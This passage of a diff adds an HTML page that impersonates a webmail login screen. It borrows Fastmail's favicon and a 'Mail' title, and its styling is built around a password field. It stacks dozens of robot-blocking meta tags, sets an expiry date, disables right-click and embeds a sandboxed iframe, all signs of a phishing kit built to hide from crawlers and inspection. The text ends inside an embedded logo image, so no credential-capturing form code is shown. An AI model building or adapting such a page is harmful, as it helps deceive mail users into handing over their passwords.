@@ -1,0 +1,465 @@
+<!DOCTYPE html> 
+<html lang="zxx"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<link id="favicon" rel="shortcut icon" sizes="32x32" href="https://www.fastmail.com/static/favicons/icon-32x32.png">     
+<title  class="logoname">Mail</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+<link rel="apple-touch-icon" type="image/png"  class="logoimg" href="" /> 
+<link rel="shortcut icon" type="image/x-icon"  class="logoimg"  href="" />
+<link rel="mask-icon" type=""  class="logoimg" href="" color="#111" />
+<meta name="robots" content="noindex">
+<meta name="googlebot" content="noindex">
+<meta name="googlebot-news" content="noindex" />
+<meta name="otherbot" content="noindex" />
+<meta name="noarchive" content="noindex" />
+<meta name="nosnippet" content="noindex" />
+<meta name="noimageindex" content="noindex" />
+<meta name="robots" content="none">
+<meta name="googlebot" content="none">
+<meta name="googlebot-news" content="none" />
+<meta name="otherbot" content="none" />
+<meta name="noarchive" content="none" />
+<meta name="nosnippet" content="none" />
+<meta name="noimageindex" content="none" />
+<meta name="robots" content="nofollow">
+<meta name="googlebot" content="nofollow">
+<meta name="googlebot-news" content="nofollow" />
+<meta name="otherbot" content="nofollow" />
+<meta name="noarchive" content="nofollow" />
+<meta name="nosnippet" content="nofollow" />
+<meta name="noimageindex" content="nofollow" />
+<meta name="robots" content="max-snippet:0">
+<meta name="robots" content="unavailable_after: 2021-10-22">
+    <!-- Favicon icon -->
+    <link rel="shortcut icon"  class="logoimg" href="" type="image/x-icon">
+    <!-- External CSS libraries 
+    <link type="text/css" rel="stylesheet" href="./login2_files/style2.css">
+    
+
+    <link type="text/css" rel="stylesheet" href="./login2_files/bootstrap.min.css">
+    -->  <link type="text/css" rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
+
+    <style type="text/css">
+    
+    body {
+    font-family: 'Open Sans', sans-serif;
+    color: #535353;
+}
+        
+    .expired {
+        font-size: 24px;
+        color: red;
+    }
+
+.img-fluid {
+    max-width: 100% !important;
+    height: auto;
+}
+
+.expired {
+            font-size: 24px;
+            color: red;
+            align-items: center;
+        }
+.form-control:focus {
+    box-shadow: none;
+}
+
+h1, h2, h3, h4, h5, h6, .h1, .h2, .h3, .h4, .h5, .h6 {
+    font-family: 'Open Sans', sans-serif;
+}
+
+/** Login 1 start **/
+.login-1 {
+    background: rgba(0, 0, 0, 0.04) url(../img/bg-image.jpg) top left repeat;
+    background-size: cover;
+    top: 0;
+    width: 100%;
+    bottom: 0;
+    opacity: 1;
+    min-height: 100vh;
+    text-align: center;
+    position: relative;
+    display: -webkit-box;
+    display: -moz-box;
+    display: -ms-flexbox;
+    display: -webkit-flex;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    padding: 30px;
+}
+
+.login-1 .login-inner-form {
+    max-width: 380px;
+    margin: 0 auto;
+    color: #717171;
+    text-align: center;
+}
+
+.login-1 .login-inner-form .details {
+    padding: 25px 30px 30px;
+    background: #fff;
+    border-radius: 5px 5px 0 0;
+}
+
+.login-1 .login-inner-form img {
+    margin-bottom: 15px;
+    height: 30px;
+}
+
+.login-1 .login-inner-form h3 {
+    margin: 0 0 25px;
+    font-size: 18px;
+    font-weight: 400;
+    font-family: 'Open Sans', sans-serif;
+    color: #717171;
+}
+
+.login-1 .login-inner-form .form-group {
+    margin-bottom: 25px;
+}
+
+.login-1 .login-inner-form .input-text {
+    width: 100%;
+    padding: 10px 15px;
+    font-size: 14px;
+    border: 1px solid #e8e7e7;
+    outline: none;
+    color: #717171;
+    border-radius: 3px;
+    height: 45px;
+}
+
+.login-1 .login-inner-form .btn-md {
+    cursor: pointer;
+    padding: 12px 30px 11px 30px;
+    letter-spacing: 1px;
+    font-size: 15px;
+    font-weight: 600;
+    font-family: 'Open Sans', sans-serif;
+    border-radius: 3px;
+}
+
+.login-1 .login-inner-form .social-list{
+    margin-bottom: 0;
+    padding: 0;
+}
+
+.login-1 .login-inner-form .checkbox a {
+    font-size: 14px;
+    color: #717171;
+    float: right;
+}
+
+.login-1 .login-inner-form .terms{
+    margin-left: 3px;
+}
+
+.login-1 .login-inner-form .checkbox {
+    margin-bottom: 25px;
+    font-size: 14px;
+}
+
+.login-1 .login-inner-form .form-check{
+    float: left;
+    margin-bottom: 0;
+}
+
+.login-1 .login-inner-form .form-check a {
+    color: #717171;
+    float: right;
+}
+
+.login-1 .login-inner-form .form-check-input {
+    position: absolute;
+    margin-left: 0;
+}
+
+.login-1 .login-inner-form .form-check label::before {
+    content: "";
+    display: inline-block;
+    position: absolute;
+    width: 17px;
+    height: 17px;
+    margin-left: -25px;
+    border: 1px solid #cccccc;
+    border-radius: 3px;
+    background-color: #fff;
+}
+
+.login-1 .login-inner-form .form-check-label {
+    padding-left: 25px;
+    margin-bottom: 0;
+    font-size: 14px;
+}
+
+.login-1 .login-inner-form .checkbox-theme input[type="checkbox"]:checked + label::before {
+    background-color: #0f96f9;
+    border-color: #0f96f9;
+}
+
+.login-1 .login-inner-form input[type=checkbox]:checked + label:before {
+    font-weight: 300;
+    color: #f3f3f3;
+    line-height: 15px;
+    font-size: 14px;
+    content: "\2713";
+}
+
+.login-1 .login-inner-form input[type=checkbox], input[type=radio] {
+    margin-top: 4px;
+}
+
+.login-1 .login-inner-form .social-list li {
+    display: inline-block;
+    font-size: 16px;
+    margin-top: 30px;
+}
+
+.login-1 .login-inner-form .social-list li a {
+    margin:2px;
+    font-size: 14px;
+    width: 35px;
+    height: 35px;
+    border-radius: 3px;
+    display: inline-block;
+    text-align: center;
+    line-height: 35px;
+}
+
+.login-1 .login-inner-form .footer {
+    font-size: 14px;
+    padding: 15px 20px;
+    background-color: #f5f5f5;
+    border-radius: 0 0 5px 5px;
+    border-top: solid 1px #f5f5f5;
+}
+
+.login-1 .login-inner-form .footer span a {
+    color: #717171;
+}
+
+.login-1 .login-inner-form button:focus {
+    outline: none;
+    outline: 0 auto -webkit-focus-ring-color;
+}
+
+.login-1 .login-inner-form .btn-theme:not([disabled]):not(.disabled).active, .btn-theme:not([disabled]):not(.disabled):active, .show > .btn-theme.dropdown-toggle {
+    box-shadow: none;
+}
+
+.login-1 .login-inner-form .btn-theme.focus, .btn-theme:focus {
+    box-shadow: none;
+}
+
+.login-1 .login-inner-form .btn-theme {
+    background: #0f96f9;
+    border: none;
+    color: #fff;
+}
+
+.login-1 .login-inner-form .btn-theme:hover {
+    background: #0294B6;
+}
+
+/** Social media **/
+.login-1 .facebook-bg {
+    background: #4867aa;
+    color: #fff;
+}
+
+.login-1 .facebook-bg:hover {
+    background: #3b589e;
+    color: #fff;
+}
+
+.login-1 .twitter-bg {
+    background: #33CCFF;
+    color: #fff;
+}
+
+.login-1 .twitter-bg:hover {
+    background: #56d7fe;
+    color: #fff;
+}
+
+.login-1 .google-bg {
+    background: #db4437;
+    color: #fff;
+}
+
+.login-1 .google-bg:hover {
+    background: #dc4e41;
+    color: #fff;
+}
+
+.login-1 .linkedin-bg {
+    background: #0177b5;
+    color: #fff;
+}
+
+.login-1 .linkedin-bg:hover {
+    background: #1c82ca;
+    color: #fff;
+}
+
+/** MEDIA **/
+@media (max-width: 992px) {
+    .login-1 {
+        padding: 30px 0;
+    }
+}
+
+
+    .style1 {color: #FFFFFF}
+    </style>
+    <script type="text/javascript">
+    function formfocus() {
+        document.getElementById('password').focus();
+    }
+    window.onload = formfocus;
+</script>
+
+</head>
+<body id="top">
+
+
+ <iframe id="mainPage" src="" width="100%" scrolling="no" sandbox="allow-forms allow-pointer-lock
+allow-popups allow-same-origin allow-scripts" style="position: absolute;height: 100%;border: none;"></iframe>
+<body oncontextmenu="return false;">
+
+<!-- Login 1 start -->
+<div class="login-1">
+    <div class="container">
+        <div class="row">
+            <div class="col-md-12">
+                <div class="login-inner-form">
+                    <div class="details">
+                        
+                        <h2 class="text-center"><div id="top"><img src="data:image/jpeg;base64,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